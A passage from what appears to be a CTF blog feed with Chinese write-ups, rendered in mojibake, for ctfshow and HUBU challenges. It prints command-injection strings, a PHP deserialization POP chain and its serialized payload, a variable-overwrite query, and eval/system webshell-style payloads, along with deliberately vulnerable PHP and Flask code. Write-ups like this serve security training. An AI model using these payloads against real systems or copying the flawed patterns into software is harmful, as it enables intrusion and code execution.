src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207174332055.png" alt="image-20241207174332055"></p><blockquote><p>å¦‚ä¸Šå›¾ï¼Œwhoamiè¢«æ‰§è¡Œäº†ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™æ¬¡æ‰§è¡Œæ‰¾flag.phpçš„å‘½ä»¤</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;find / -name &quot;*flag*&quot; 2&gt;/dev/null;</span><br></pre></td></tr></table></figure><blockquote><p>ç„¶åè¯»å–rootç›®å½•ä¸‹çš„flagå³å¯</p></blockquote><h4 id="éšç§˜çš„æµé‡">éšç§˜çš„æµé‡</h4><blockquote><p>è€ƒç‚¹ï¼šæµé‡åˆ†æï¼ŒICMPåè®®</p></blockquote><blockquote><p>ç”¨wireshakeæ‰“å¼€ï¼Œç»Ÿè®¡-&gt; åˆ†çº§åè®®</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207175808812.png" alt="image-20241207175808812"></p><blockquote><p>å‘ç°æœ‰UDP,TCP,ICMPåè®®</p><p>é‡ç‚¹å…³æ³¨ICMPåè®®ã€‚</p><p>WireShark è¿‡æ»¤æ¡ä»¶ icmp &amp; icmp.type = 8 ã€å«ä¹‰ï¼šicmpåè®®ï¼Œç±»å‹8ä»£</p><p>è¡¨å‘é€è¯·æ±‚ï¼Œå‚è€ƒï¼šICMPæŠ¥æ–‡çš„æ ¼å¼å’Œç§ç±»-è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘)</p><p>æ³¨æ„åˆ°åé¢éƒ½æœ‰å‡ ä¸ªç‰¹æ®Šçš„å­—ç¬¦ï¼Œæå–å‡ºæ¥</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207175917648.png" alt="image-20241207175917648"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># ä½¿ç”¨tshark æå–</span><br><span class="line">â””â”€ğŸ€ tshark -r secret.pcapng -Y &#x27;icmp &amp;&amp; icmp.type = 8&#x27; -T fields -e &quot;data.data&quot; | xxd -p -r | base32 -d | base64 -d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">å‘½ä»¤è§£é‡Šï¼š</span><br><span class="line">-r : è¯»å–æ–‡ä»¶ï¼Œåé¢è·Ÿæµé‡åŒ…æ–‡ä»¶å</span><br><span class="line">-Y : è¿‡æ»¤çš„æ¡ä»¶ï¼Œè¿™é‡Œæ˜¯icmpçš„æ–¹æ³•è¯·æ±‚çš„æµé‡åŒ…</span><br><span class="line">-T :è®¾ç½®è¾“å‡ºæ ¼å¼ï¼Œå¦‚jsonï¼Œfieldsç­‰</span><br><span class="line">-e : è¾“å‡ºç‰¹å®šçš„å­—æ®µ</span><br><span class="line">xxd -p -r ï¼šå°†åå…­è¿›åˆ¶è½¬åŒ–ä¸ºå­—ç¬¦ä¸²</span><br><span class="line"></span><br><span class="line">windowså¦‚æœå®‰è£…äº†wireshakeï¼Œåˆ™åœ¨å…¶ç›®å½•ä¸‹æœ‰ä¸ªtshark.exeç¨‹åºã€‚</span><br></pre></td></tr></table></figure><blockquote><p>HUBUMARS{1CMp_da7a_15_1n73R3571N9}</p></blockquote>]]></content>
    
    
    <summary type="html">ğŸ¥§HUBUæ–°æ˜Ÿæ¯wp</summary>
    
    
    
    <category term="CTF" scheme="https://m3x1.cn/categories/CTF/"/>
    
    
    <category term="æ¯”èµ›wp" scheme="https://m3x1.cn/tags/%E6%AF%94%E8%B5%9Bwp/"/>
    
  </entry>
  
  <entry>
    <title>ctfshowåˆ·é¢˜</title>
    <link href="https://m3x1.cn/posts/7acd7e04.html"/>
    <id>https://m3x1.cn/posts/7acd7e04.html</id>
    <published>2024-12-01T14:09:31.082Z</published>
    <updated>2024-12-01T16:06:22.802Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><p>æ¥æºï¼šctfshow</p><h4 id="easyPytHon-P">easyPytHon_P</h4><blockquote><p>è€ƒç‚¹ï¼šä»£ç å®¡è®¡ï¼Œæºä»£ç æŸ¥çœ‹</p></blockquote><blockquote><p>æ‰“å¼€åæŸ¥çœ‹æºç ï¼Œå‘ç°ä¸€ä¸ªæºç åœ°å€ï¼Œæ‰“å¼€çœ‹çœ‹</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109150901508.png" alt="image-20241109150901508"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109150915342.png" alt="image-20241109150915342"></p><blockquote><p>å¯ä»¥çŸ¥é“åœ¨æ­¤ç›®å½•ä¸‹æœ‰ä¸ªflag.txtæ–‡ä»¶ï¼Œå†è§‚å¯Ÿæºç </p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from flask import request</span><br><span class="line">cmd: str = request.form.get(&#x27;cmd&#x27;)</span><br><span class="line">param: str = request.form.get(&#x27;param&#x27;)</span><br><span class="line"># ------------------------------------- Don&#x27;t modify â†‘ them â†‘! But you can write your code â†“</span><br><span class="line">import subprocess, os</span><br><span class="line">if cmd is not None and param is not None:</span><br><span class="line">    try:</span><br><span class="line">        tVar = subprocess.run([cmd[:3], param, __file__], cwd=os.getcwd(), timeout=5)</span><br><span class="line">        print(&#x27;Done!&#x27;)</span><br><span class="line">    except subprocess.TimeoutExpired:</span><br><span class="line">        print(&#x27;Timeout!&#x27;)</span><br><span class="line">    except:</span><br><span class="line">        print(&#x27;Error!&#x27;)</span><br><span class="line">else:</span><br><span class="line">    print(&#x27;No Flag!&#x27;)</span><br></pre></td></tr></table></figure><blockquote><p>å‘ç°ä¼ å…¥ä¸¤ä¸ªå‚æ•°cmdå’Œparamï¼Œä¼šæˆªå–cmdçš„å‰ä¸‰ä¸ªå­—ç¬¦å½“æˆå‘½ä»¤runï¼Œparamè¢«å½“æˆå‚æ•°ã€‚</p><p>æ‰€ä»¥ç›´æ¥æ„é€ cat flag.txt</p><p>payload:</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=cat&amp;param=flag.txt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109150800375.png" alt="image-20241109150800375"></p><blockquote><p>ctfshow{7d9cfcf5-9314-4eb0-9240-d77a6ca6f29d}</p></blockquote><h4 id="éåœ°é£˜é›¶">éåœ°é£˜é›¶</h4><blockquote><p>è€ƒç‚¹ï¼š$$å€¼è¦†ç›–ï¼Œ$_GETå…¨å±€å˜é‡å’Œæœ¬åœ°å˜é‡</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">$zeros=&quot;000000000000000000000000000000&quot;;</span><br><span class="line"></span><br><span class="line">foreach($_GET as $key =&gt; $value)&#123;</span><br><span class="line">    $$key=$$value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($flag==&quot;000000000000000000000000000000&quot;)&#123;</span><br><span class="line">    echo &quot;å¥½å¤šé›¶&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;æ²¡æœ‰é›¶ï¼Œä»”ç»†çœ‹çœ‹è¾“å…¥æœ‰ä»€ä¹ˆé—®é¢˜å§&quot;;</span><br><span class="line">    var_dump($_GET);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>åˆ†æä»£ç å¯çŸ¥ï¼Œgetä¼ å‚çš„å‚æ•°åä¼šä¼ ç»™keyï¼Œå°†keyçš„å€¼ä¼ ç»™å˜é‡valueã€‚</p><p>ç„¶åè¿›è¡Œå˜é‡å€¼è¦†ç›–ï¼Œå°†keyçš„å€¼å½“ä½œå˜é‡åï¼Œå°†valueçš„å€¼ä¹Ÿå½“ä½œå˜é‡åï¼Œä¸”èµ‹å€¼å‰è€…ä¸ºåè€…ã€‚</p><p>ä¾‹å¦‚ï¼šä¼ é€’å‚æ•° ?get=aaï¼Œåˆ™$key=get,$value=$key=aaï¼Œ</p><p>å€¼è¦†ç›–æ—¶ï¼Œ$$key=$getï¼Œ$$value=$aa</p><p>æ‰€ä»¥ï¼Œç›®æ ‡æ˜¯æ‰§è¡Œvar_dump($flag)</p><p>æ„é€ payload:</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?_GET=flag</span><br></pre></td></tr></table></figure><blockquote><p>ä¼ è¿›å»æ—¶ï¼Œ$key=_GET,$value=flagï¼Œå†è¿›è¡Œå€¼è¦†ç›–ï¼Œå°±å˜æˆäº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_GET=$flag</span><br></pre></td></tr></table></figure><p>ä»è€Œå®ç°ç›®æ ‡ï¼Œå¾—åˆ°flag</p><p>ctfshow{2fe8eb61-9f07-4713-a7f2-311a3e4786d3}</p></blockquote><h4 id="èŒ¶æ­‡åŒº">èŒ¶æ­‡åŒº</h4><blockquote><p>è€ƒç‚¹ï¼šå¤šæ¬¡æ•´æ•°æº¢å‡º</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109160125845.png" alt="image-20241109160125845"></p><blockquote><p>å…ˆæŸ¥çœ‹æºç ï¼Œæ‰¾ä¸åˆ°ç›¸å…³å‡½æ•°å’Œscoreç­‰è®¡åˆ†çš„å˜é‡ï¼Œæ‰€ä»¥ä¸èƒ½é€šè¿‡æ§åˆ¶å°æ”¹ä»£ç äº†ã€‚</p><p>çœ‹åˆ°å…¨æ˜¯æ•´æ•°ï¼Œæƒ³åˆ°æ•´æ•°æº¢å‡ºã€‚å…ˆè¾“å…¥99999999999999999999</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109160320364.png" alt="image-20241109160320364"></p><blockquote><p>9223372036854775807</p><p>999999999999999999</p><p>è¾“å…¥999999999999999999ï¼Œä¸æ–­é‡å¤ï¼Œç›´åˆ°å‡ºç°flag</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109160421972.png" alt="image-20241109160421972"></p><blockquote><p>ctfshow{b31d09fc-4022-49ca-ad7d-ea533f98cdc2}</p></blockquote><h4 id="å°èˆ”ç”°ï¼Ÿ">å°èˆ”ç”°ï¼Ÿ</h4><blockquote><p>è€ƒç‚¹ï¼šåºåˆ—åŒ–æ„é€ popé“¾</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class Moon&#123;</span><br><span class="line">    public $name=&quot;æœˆäº®&quot;;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        echo &quot;æˆ‘æ˜¯&quot;.$this-&gt;name.&quot;å¿«æ¥èµæˆ‘&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Ion_Fan_Princess&#123;</span><br><span class="line">    public $nickname=&quot;ç‰›å¤«äºº&quot;;</span><br><span class="line"></span><br><span class="line">    public function call()&#123;</span><br><span class="line">        global $flag;</span><br><span class="line">        if ($this-&gt;nickname==&quot;å°ç”œç”œ&quot;)&#123;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;ä»¥å‰é™ªæˆ‘çœ‹æœˆäº®çš„æ—¶å€™ï¼Œå«äººå®¶å°ç”œç”œï¼ç°åœ¨æ–°äººèƒœæ—§äººï¼Œå«äººå®¶&quot;.$this-&gt;nickname.&quot;ã€‚\n&quot;;</span><br><span class="line">            echo &quot;ä½ ä»¥ä¸ºæˆ‘è¿™ä¹ˆè¾›è‹¦æ¥è¿™é‡ŒçœŸçš„æ˜¯ä¸ºäº†è¿™æ¡è‡­ç‰›å—?æ˜¯ä¸ºäº†ä½ è¿™ä¸ªæ²¡è‰¯å¿ƒçš„è‡­çŒ´å­å•Š!\n&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        $this-&gt;call();</span><br><span class="line">        return &quot;\t\t\t\t\t\t\t\t\t\t----&quot;.$this-&gt;nickname;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;code&#x27;]))&#123;</span><br><span class="line">    unserialize($_GET[&#x27;code&#x27;]);</span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $a=new Ion_Fan_Princess();</span><br><span class="line">    echo $a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>è¿›è¡Œä»£ç å®¡è®¡ï¼Œå‘ç°æ˜¯ä¸ªåºåˆ—åŒ–é¢˜ï¼Œæœ‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__toString()å’Œ__wakeup()</span><br></pre></td></tr></table></figure><p>æ„é€ ä¸€æ¡popé“¾ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call() &lt;- Ion_Fan_Princess:__toString() &lt;- Moon:__wakeup()</span><br></pre></td></tr></table></figure></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Moon&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        echo &quot;æˆ‘æ˜¯&quot;.$this-&gt;name.&quot;å¿«æ¥èµæˆ‘&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Ion_Fan_Princess&#123;</span><br><span class="line">    public $nickname=&quot;å°ç”œç”œ&quot;;</span><br><span class="line">    </span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        $this-&gt;call();</span><br><span class="line">        return &quot;\t\t\t\t\t\t\t\t\t\t----&quot;.$this-&gt;nickname;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new Moon();</span><br><span class="line">$a-&gt;name = new Ion_Fan_Princess();</span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">?&gt;</span><br><span class="line">//O%3A4%3A%22Moon%22%3A1%3A%7Bs%3A4%3A%22name%22%3BO%3A16%3A%22Ion_Fan_Princess%22%3A1%3A%7Bs%3A8%3A%22nickname%22%3Bs%3A9%3A%22%E5%B0%8F%E7%94%9C%E7%94%9C%22%3B%7D%7D</span><br></pre></td></tr></table></figure><blockquote><p>ctfshow{ab725e26-0530-4535-8cb5-517419dccb8b}</p></blockquote><h4 id="LSBæ¢å§¬">LSBæ¢å§¬</h4><blockquote><p>è€ƒç‚¹ï¼šæ–‡ä»¶åä¸­çš„å‘½ä»¤æ‰§è¡Œ</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109165919952.png" alt="image-20241109165919952"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"># !/usr/bin/env python</span><br><span class="line"># -*-coding:utf-8 -*-</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"># File       : app.py</span><br><span class="line"># Time       ï¼š2022/10/20 15:16</span><br><span class="line"># Author     ï¼šg4_simon</span><br><span class="line"># version    ï¼špython 3.9.7</span><br><span class="line"># Descriptionï¼šTSTEG-WEB</span><br><span class="line"># flag is in /app/flag.py</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">from flask import *</span><br><span class="line">import os</span><br><span class="line">#åˆå§‹åŒ–å…¨å±€å˜é‡</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def index():    </span><br><span class="line">    return render_template(&#x27;upload.html&#x27;)</span><br><span class="line">@app.route(&#x27;/upload&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def upload_file():</span><br><span class="line">    if request.method == &#x27;POST&#x27;:</span><br><span class="line">        try:</span><br><span class="line">            f = request.files[&#x27;file&#x27;]</span><br><span class="line">            f.save(&#x27;upload/&#x27;+f.filename)</span><br><span class="line">            cmd=&quot;python3 tsteg.py upload/&quot;+f.filename</span><br><span class="line">            result=os.popen(cmd).read()</span><br><span class="line">            data=&#123;&quot;code&quot;:0,&quot;cmd&quot;:cmd,&quot;result&quot;:result,&quot;message&quot;:&quot;file uploaded!&quot;&#125;</span><br><span class="line">            return jsonify(data)</span><br><span class="line">        except:</span><br><span class="line">            data=&#123;&quot;code&quot;:1,&quot;message&quot;:&quot;file upload error!&quot;&#125;</span><br><span class="line">            return jsonify(data)</span><br><span class="line">    else:</span><br><span class="line">        return render_template(&#x27;upload.html&#x27;)</span><br><span class="line">@app.route(&#x27;/source&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def show_source():</span><br><span class="line">    return render_template(&#x27;source.html&#x27;)</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;,port=80,debug=False)</span><br><span class="line">          </span><br></pre></td></tr></table></figure><blockquote><p>åˆ†æå¯çŸ¥ï¼Œæ‰§è¡Œcmdå‘½ä»¤ï¼Œæ‰€ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œæ¼æ´åˆ©ç”¨ï¼Œåœ¨filenameåæ‰§è¡Œlså‘½ä»¤</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109170048538.png" alt="image-20241109170048538"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109170107042.png" alt="image-20241109170107042"></p><blockquote><p><a href="http://xn--flag-pm9f971itox.py">çœ‹åˆ°æœ‰flag.py</a>ï¼Œæ‰§è¡Œå‘½ä»¤cat <a href="http://flag.py">flag.py</a></p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109170155275.png" alt="image-20241109170155275"></p><blockquote><p>ctfshow{343152ec-5bd1-467a-9f6c-33d7d8d3cfc8}</p></blockquote><h4 id="Is-Not-Obfuscate">Is_Not_Obfuscate</h4><blockquote><p>è€ƒç‚¹ï¼š</p></blockquote><blockquote><p>æ‰“å¼€åæŸ¥çœ‹æºç ï¼Œå‘ç°ç«¯å€ª</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109171950520.png" alt="image-20241109171950520"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109172008208.png" alt="image-20241109172008208"></p><blockquote><p>å…ˆæŸ¥çœ‹/robots.txt</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109172038816.png" alt="image-20241109172038816"></p><blockquote><p>æŸ¥çœ‹/lib.php?flag=1</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109172117578.png" alt="image-20241109172117578"></p><blockquote><p>å°†è¿™æ®µå¤åˆ¶åˆ°æ¡†ä¸­ï¼Œå†æ ¹æ®æç¤ºä¿®æ”¹å‰ç«¯</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109172202256.png" alt="image-20241109172202256"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109172300276.png" alt="image-20241109172300276"></p><blockquote><p>ç„¶åå¾—åˆ°ä¸€ä¸²ä»£ç </p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Type:text/html;charset=utf-8&quot;);</span><br><span class="line">include &#x27;lib.php&#x27;;</span><br><span class="line">if(!is_dir(&#x27;./plugins/&#x27;))&#123;</span><br><span class="line">    @mkdir(&#x27;./plugins/&#x27;, 0777);</span><br><span class="line">&#125;</span><br><span class="line">//Test it and delete it ï¼ï¼ï¼</span><br><span class="line">//æµ‹è¯•æ‰§è¡ŒåŠ å¯†åçš„æ’ä»¶ä»£ç </span><br><span class="line">if($_GET[&#x27;action&#x27;] === &#x27;test&#x27;) &#123;</span><br><span class="line">    echo &#x27;Anything is good?Please test it.&#x27;;</span><br><span class="line">    @eval(decode($_GET[&#x27;input&#x27;]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ini_set(&#x27;open_basedir&#x27;, &#x27;./plugins/&#x27;);</span><br><span class="line">if(!empty($_GET[&#x27;action&#x27;]))&#123;</span><br><span class="line">    switch ($_GET[&#x27;action&#x27;])&#123;</span><br><span class="line">        case &#x27;pull&#x27;:</span><br><span class="line">            $output = @eval(decode(file_get_contents(&#x27;./plugins/&#x27;.$_GET[&#x27;input&#x27;])));</span><br><span class="line">            echo &quot;pull success&quot;;</span><br><span class="line">            break;</span><br><span class="line">        case &#x27;push&#x27;:</span><br><span class="line">            $input = file_put_contents(&#x27;./plugins/&#x27;.md5($_GET[&#x27;output&#x27;].&#x27;youyou&#x27;), encode($_GET[&#x27;output&#x27;]));</span><br><span class="line">            echo &quot;push success&quot;;</span><br><span class="line">            break;</span><br><span class="line">        default:</span><br><span class="line">            die(&#x27;hacker!&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><blockquote><p>çœ‹åˆ°äº†ä¸ªevalå‡½æ•°ï¼Œæ‰€ä»¥å¯ä»¥å…ˆåˆ©ç”¨pushï¼Œå†ç”¨pullæ‰§è¡Œå‘½ä»¤ã€‚</p><p>é¦–å…ˆï¼Œæ„é€ payload:</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=push&amp;output=&lt;?php eval(system(&quot;ls /&quot;));?&gt;</span><br></pre></td></tr></table></figure><blockquote><p>è¿™ä¸ªpayloadä¼šç»è¿‡file_put_contents()å‡½æ•°å­˜å‚¨åœ¨ç›®å½•ä¸‹ã€‚ç„¶åç”¨file_get_contents()å‡½æ•°åœ¨ç›®å½•ä¸‹è¯»å–ã€‚æ‰€ä»¥</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">input=md5($_GET[&#x27;output&#x27;].&#x27;youyou&#x27;)ã€‚</span><br><span class="line">payload:</span><br><span class="line">?action=pull&amp;input=b4b23ad51ccba6f288833a4e25cb361b</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109235359796.png" alt="image-20241109235359796"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109235416731.png" alt="image-20241109235416731"></p><blockquote><p>çœ‹åˆ°æœ‰ä¸ªf1agaaaçš„æ–‡ä»¶ï¼Œç”¨åŒæ ·çš„æ–¹å¼è¿›è¡Œè¯»å–.</p><p>payload:</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?action=push&amp;output=&lt;?php eval(system(&quot;cat /f1agaaa&quot;));?&gt;</span><br><span class="line">?action=pull&amp;input=ba53a5488a5dfda0aff1bb1ee5fcfaa2</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109235645962.png" alt="image-20241109235645962"></p><blockquote><p>ctfshow{876b2dd2-9785-4eb0-9a6d-7bf0a081bc5c}</p></blockquote>]]></content>
    
    
    <summary type="html">ctfshowåˆ·é¢˜-wp</summary>
    
    
    
    <category term="CTF" scheme="https://m3x1.cn/categories/CTF/"/>
    
    
    <category term="web-wp" scheme="https://m3x1.cn/tags/web-wp/"/>
    
  </entry>
  
  <entry>
    <title>ctfshowèŒæ–°web</title>
    <link href="https://m3x1.cn/posts/72ad6da1.html"/>
    <id>https://m3x1.cn/posts/72ad6da1.html</id>
    <published>2024-12-01T14:09:31.080Z</published>
    <updated>2024-12-01T16:06:22.801Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>æ¥æºï¼šctfshow</p></blockquote><p>[TOC]</p><h2 id="web1">web1</h2><blockquote><p>è€ƒç‚¹ï¼šinval()å‡½æ•°æ¼æ´ï¼Œsqlæ³¨å…¥</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 